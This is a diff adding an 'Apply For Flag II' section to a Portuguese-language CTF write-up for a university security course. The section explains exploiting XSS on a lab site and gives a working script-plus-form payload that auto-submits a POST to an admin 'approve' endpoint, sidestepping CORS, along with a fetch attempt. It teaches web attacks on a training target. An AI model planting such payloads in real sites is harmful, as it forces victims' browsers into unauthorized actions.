@@ -73,6 +73,36 @@ E assim já funcionou
 
 ![image-8.png](/images/ctf_fs/image-8.png)
 
+## Apply For Flag II
+
+Escrevemos um script na caixa de texto para verificar se era vulnerável a xss.
+
+![](https://i.imgur.com/KW9QF4j.png)
+E verificamos que era
+![](https://i.imgur.com/exYmHdG.png)
+
+Depois encontramos o botão que servia para o admin nos enviar a flag.
+
+![](https://i.imgur.com/2qsy1WJ.png)
+
+Uma vez que a porta do site de origem é diferente da do site onde se envia o post, se fizermos apenas um script que envia o pedido (usando fetch) o coors bloqueia como se pode ver a seguir.
+
+```htmlembedded=
+<script> fetch("http://ctf-fsi.fe.up.pt:5005//request/4e860dc39ba2a2b06f97508f88194861dad75ebc/approve) ", {method: "POST"})</script>
+```
+![](https://i.imgur.com/bf3xyOm.png)
+
+Uma forma de contornar isso é criar um form, e submete-lo.
+
+```htmlembedded=
+<form id="flag_form" method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/28682e517d19ba1c197a730cebbb738e484b1fdc/approve" role="form"> <div class="submit"> <input type="submit" id="giveflag" value="Give the flag" > </div> </form> <script> console.log(document.getElementById('flag')); document.getElementById('giveflag').click() </script>
+```
+
+![](https://i.imgur.com/ySSonGg.png)
+
+
+
+
 ## NumberStation3
 Observando o código fornecido, apesar da chave gerada ter 256 bits, de facto só existem 2^16 chaves possíveis, já que é feito um bitwise & com 1 para cada byte, ou seja, cada byte dos 16 que constituem a chave ou são iguais a 0 ou iguais a 1. 
 ![img](images/extras/numberstation3_b.png)
